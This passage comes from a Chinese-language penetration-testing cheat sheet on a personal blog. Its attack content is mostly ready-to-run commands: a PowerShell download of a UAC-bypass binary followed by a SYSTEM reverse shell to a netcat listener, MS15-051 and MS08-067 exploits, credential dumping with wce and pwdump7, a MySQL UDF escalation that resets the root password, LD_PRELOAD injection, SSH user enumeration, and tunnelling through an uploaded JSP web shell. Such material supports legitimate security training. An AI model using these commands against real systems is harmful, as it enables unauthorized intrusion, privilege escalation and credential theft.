-NonInteractive -File script2.ps1</span><br><span class="line"></span><br><span class="line"># 使用预编译的二进制文件绕过 UAC:</span><br><span class="line"></span><br><span class="line">https://github.com/hfiref0x/UACME</span><br><span class="line"></span><br><span class="line"># 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</span><br><span class="line"></span><br><span class="line"># 在 Kali 上创建监听</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># 以系统权限使用 Akagi64 运行 danger.exe </span><br><span class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</span><br><span class="line"></span><br><span class="line"># 在 Kali 上创建监听</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># 下一步就会反弹给我们一个提过权的 shell</span><br><span class="line"># 以系统权限使用 PsExec 运行 danger.exe </span><br><span class="line">psexec.exe –i –d –accepteula –s danger.exe</span><br></pre></td></tr></table></figure>

<h3 id="以普通用户身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以普通用户身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以普通用户身份在 Win7 上反弹具有系统权限的 Shell"></a>以普通用户身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</span><br><span class="line"></span><br><span class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/exploits/37049/</span><br><span class="line"></span><br><span class="line"># 查找目标机器是否安装了补丁，输入如下命令</span><br><span class="line">wmic qfe get</span><br><span class="line">wmic qfe | find &quot;3057191&quot;</span><br><span class="line"></span><br><span class="line"># 上传编译后的利用程序并运行它</span><br><span class="line"></span><br><span class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span><br><span class="line"></span><br><span class="line"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</span><br><span class="line"># https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 &quot;main.c&quot;</span><br><span class="line"></span><br><span class="line"># 使用 wce.exe 获取已登录用户的明文账号密码</span><br><span class="line"></span><br><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line"></span><br><span class="line">wce -w</span><br><span class="line"></span><br><span class="line"># 使用 pwdump7 获取其他用户的密码哈希值</span><br><span class="line"></span><br><span class="line">http://www.heise.de/download/pwdump.html</span><br><span class="line"></span><br><span class="line"># we can try online hash cracking tools such crackstation.net</span><br></pre></td></tr></table></figure>

<h3 id="MS08-067-–-不使用-Metasploit"><a href="#MS08-067-–-不使用-Metasploit" class="headerlink" title="MS08-067 – 不使用 Metasploit"></a>MS08-067 – 不使用 Metasploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</span><br><span class="line">$ searchsploit ms08-067</span><br><span class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</span><br></pre></td></tr></table></figure>

<h3 id="通过-MySQL-Root-账户实现提权"><a href="#通过-MySQL-Root-账户实现提权" class="headerlink" title="通过 MySQL Root 账户实现提权"></a>通过 MySQL Root 账户实现提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span><br><span class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</span><br><span class="line">$ gcc -g -c raptor_udf2.c</span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;/home/user/raptor_udf2.so&#x27;));</span><br><span class="line">mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br><span class="line">mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">mysql&gt; select do_system(&#x27;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&#x27;);</span><br><span class="line"></span><br><span class="line">user:~$ su -</span><br><span class="line">Password:</span><br><span class="line">user:~# whoami</span><br><span class="line">root</span><br><span class="line">root:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="使用-LD-PRELOAD-注入程序"><a href="#使用-LD-PRELOAD-注入程序" class="headerlink" title="使用 LD_PRELOAD 注入程序"></a>使用 LD_PRELOAD 注入程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</span><br><span class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</span><br><span class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</span><br></pre></td></tr></table></figure>

<h3 id="针对-OpenSSH-用户进行枚举时序攻击"><a href="#针对-OpenSSH-用户进行枚举时序攻击" class="headerlink" title="针对 OpenSSH 用户进行枚举时序攻击"></a>针对 OpenSSH 用户进行枚举时序攻击</h3><p>注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 <a target="_blank" rel="noopener" href="http://zhihu.com/question/20156213/answer/43377769">shotgun</a> 在知乎上的解释。</p>
<p>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/c0r3dump3d/osueta</span><br><span class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</span><br><span class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道"><a href="#使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道" class="headerlink" title="使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道"></a>使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</h3><p>注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
<p>对了亲～ReDuh-Gui 号称端口转发神器哦。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/sensepost/reDuh</span><br><span class="line"></span><br><span class="line"># 步骤 1</span><br><span class="line"># 上传 reDuh.jsp 目标服务器</span><br><span class="line">$ http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"># 步骤 2</span><br><span class="line"># 在本机运行 reDuhClient </span><br><span class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"># 步骤 3</span><br><span class="line"># 使用 nc 连接管理端口</span><br><span class="line">$ nc -nvv 127.0.0.1 1010</span><br><span class="line"></span><br><span class="line"># 步骤 4</span><br><span class="line"># 使用隧道转发本地端口到远程目标端口</span><br><span class="line">[createTunnel] 7777:172.16.0.4:3389</span><br><span class="line"></span><br><span class="line"># 步骤 5</span><br><span class="line"># 使用 RDP 连接远程</span><br><span class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://ckcah.github.io">bosch</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ckcah.github.io/2020/05/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7/">https://ckcah.github.io/2020/05/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8A%80%E5%B7%A7/">技巧</a></div><div class="post_share"><div class="social-share" data-image="https://i.pinimg.com/236x/7e/f4/e1/7ef4e177d194f9d8b9c7df1375319f14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/05/11/dedecms%E4%BD%8E%E4%BA%8E5-7SP2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2019/07/14/16/27/pen-4337521__340.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">dedecms低于5.7SP2任意文件上传漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/10/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/11/23/14/45/coding-1853305__340.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">PHP文件包含漏洞利用思路与Bypass总结（不完整）</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Gitalk</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://ckcah.github.io/images/title1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">bosch</div><div class="author-info__description">现在就要学既走得快又走得远的东西</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">41</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ckcah"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ckcah" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:bcheng490@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">不管怎么样，总要追求点什么，多累一点才好</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%A5%BD%E7%9A%84-NMAP-%E6%89%AB%E6%8F%8F%E7%AD%96%E7%95%A5"><span class="toc-number">1.</span> <span class="toc-text">最好的 NMAP 扫描策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-%E2%80%93-%E8%BA%B2%E9%81%BF%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.</span> <span class="toc-text">Nmap – 躲避防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-%E8%BF%9B%E8%A1%8C-Web-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">Nmap 进行 Web 漏洞扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-DIRB-%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">使用 DIRB 爆破目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patator-%E2%80%93-%E5%85%A8%E8%83%BD%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">5.</span> <span class="toc-text">Patator – 全能暴力破解测试工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Fierce-%E7%88%86%E7%A0%B4-DNS"><span class="toc-number">6.</span> <span class="toc-text">使用 Fierce 爆破 DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Nikto-%E6%89%AB%E6%8F%8F-Web-%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.</span> <span class="toc-text">使用 Nikto 扫描 Web 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F-WordPress"><span class="toc-number">8.</span> <span class="toc-text">扫描 WordPress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">9.</span> <span class="toc-text">HTTP 指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Skipfish-%E6%89%AB%E6%8F%8F"><span class="toc-number">10.</span> <span class="toc-text">使用 Skipfish 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-NC-%E6%89%AB%E6%8F%8F"><span class="toc-number">11.</span> <span class="toc-text">使用 NC 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicornscan"><span class="toc-number">12.</span> <span class="toc-text">Unicornscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Xprobe2-%E8%AF%86%E5%88%AB%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9"><span class="toc-number">13.</span> <span class="toc-text">使用 Xprobe2 识别操作系统指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-Samba"><span class="toc-number">14.</span> <span class="toc-text">枚举 Samba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-SNMP"><span class="toc-number">15.</span> <span class="toc-text">枚举 SNMP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%94%A8%E7%9A%84-Windows-cmd-%E5%91%BD%E4%BB%A4"><span class="toc-number">16.</span> <span class="toc-text">实用的 Windows cmd 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PuTTY-%E8%BF%9E%E6%8E%A5%E9%9A%A7%E9%81%93"><span class="toc-number">17.</span> <span class="toc-text">PuTTY 连接隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">18.</span> <span class="toc-text">Meterpreter 端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF-RDP-%E6%9C%8D%E5%8A%A1"><span class="toc-number">19.</span> <span class="toc-text">开启 RDP 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD-Windows-%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">20.</span> <span class="toc-text">关闭 Windows 防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter-VNC-RDP"><span class="toc-number">21.</span> <span class="toc-text">Meterpreter VNC\RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz"><span class="toc-number">22.</span> <span class="toc-text">使用 Mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">23.</span> <span class="toc-text">获取哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Hashcat-%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">24.</span> <span class="toc-text">使用 Hashcat 破解密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-NC-%E6%8A%93%E5%8F%96-Banner-%E4%BF%A1%E6%81%AF"><span class="toc-number">25.</span> <span class="toc-text">使用 NC 抓取 Banner 信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-NC-%E5%9C%A8-Windows-%E4%B8%8A%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">26.</span> <span class="toc-text">使用 NC 在 Windows 上反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE-SUID-SGID-root-%E6%96%87%E4%BB%B6"><span class="toc-number">27.</span> <span class="toc-text">查找 SUID\SGID root 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-shell"><span class="toc-number">28.</span> <span class="toc-text">Python shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Ruby-PHP-HTTP-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">29.</span> <span class="toc-text">Python\Ruby\PHP HTTP 服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E5%AF%B9%E5%BA%94%E7%9A%84-PID"><span class="toc-number">30.</span> <span class="toc-text">获取进程对应的 PID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Hydra-%E7%88%86%E7%A0%B4-RDP"><span class="toc-number">31.</span> <span class="toc-text">使用 Hydra 爆破 RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E8%BF%9C%E7%A8%8B-Windows-%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">32.</span> <span class="toc-text">挂载远程 Windows 共享文件夹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-%E4%B8%8B%E7%BC%96%E8%AF%91-Exploit"><span class="toc-number">33.</span> <span class="toc-text">Kali 下编译 Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-%E4%B8%8B%E7%BC%96%E8%AF%91-Windows-Exploit"><span class="toc-number">34.</span> <span class="toc-text">Kali 下编译 Windows Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NASM-%E5%91%BD%E4%BB%A4"><span class="toc-number">35.</span> <span class="toc-text">NASM 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%A9%BF%E9%80%8F"><span class="toc-number">36.</span> <span class="toc-text">SSH 穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%A9%BF%E9%80%8F%E4%BB%8E%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C"><span class="toc-number">37.</span> <span class="toc-text">SSH 穿透从一个网络到另一个网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-metasploit-%E8%BF%9B%E8%A1%8C%E7%A9%BF%E9%80%8F"><span class="toc-number">38.</span> <span class="toc-text">使用 metasploit 进行穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-CSV-%E6%96%87%E4%BB%B6%E6%9F%A5%E8%AF%A2-Exploit-DB"><span class="toc-number">39.</span> <span class="toc-text">基于 CSV 文件查询 Exploit-DB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-Payloads"><span class="toc-number">40.</span> <span class="toc-text">MSF Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%9C%A8-Linux-%E4%B8%8B%E5%8F%8D%E5%BC%B9%E7%9A%84-Meterpreter-Shell"><span class="toc-number">41.</span> <span class="toc-text">MSF 生成在 Linux 下反弹的 Meterpreter Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9-Shell-C-Shellcode"><span class="toc-number">42.</span> <span class="toc-text">MSF 生成反弹 Shell (C Shellcode)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9-Python-Shell"><span class="toc-number">43.</span> <span class="toc-text">MSF 生成反弹 Python Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9-ASP-Shell"><span class="toc-number">44.</span> <span class="toc-text">MSF 生成反弹 ASP Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9-Bash-Shell"><span class="toc-number">45.</span> <span class="toc-text">MSF 生成反弹 Bash Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9-PHP-Shell"><span class="toc-number">46.</span> <span class="toc-text">MSF 生成反弹 PHP Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9-Win-Shell"><span class="toc-number">47.</span> <span class="toc-text">MSF 生成反弹 Win Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%B8%B8%E7%94%A8%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">48.</span> <span class="toc-text">Linux 常用安全命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">49.</span> <span class="toc-text">Windows 缓冲区溢出利用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SEH-%E2%80%93-%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-number">50.</span> <span class="toc-text">SEH – 结构化异常处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-DEP"><span class="toc-number">51.</span> <span class="toc-text">ROP (DEP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR-%E2%80%93-%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E6%A0%BC%E5%B1%80%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="toc-number">52.</span> <span class="toc-text">ASLR – 地址空间格局随机化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E8%9B%8B-EGG-Hunter-%E6%8A%80%E6%9C%AF"><span class="toc-number">53.</span> <span class="toc-text">寻蛋(EGG Hunter)技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB-Debugger-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">54.</span> <span class="toc-text">GDB Debugger 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BASH-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">55.</span> <span class="toc-text">BASH 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PERL-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">56.</span> <span class="toc-text">PERL 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RUBY-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">57.</span> <span class="toc-text">RUBY 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PYTHON-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">58.</span> <span class="toc-text">PYTHON 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">59.</span> <span class="toc-text">PHP 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">60.</span> <span class="toc-text">JAVA 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NETCAT-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">61.</span> <span class="toc-text">NETCAT 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TELNET-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">62.</span> <span class="toc-text">TELNET 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XTERM-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">63.</span> <span class="toc-text">XTERM 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-number">64.</span> <span class="toc-text">XSS 备忘录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 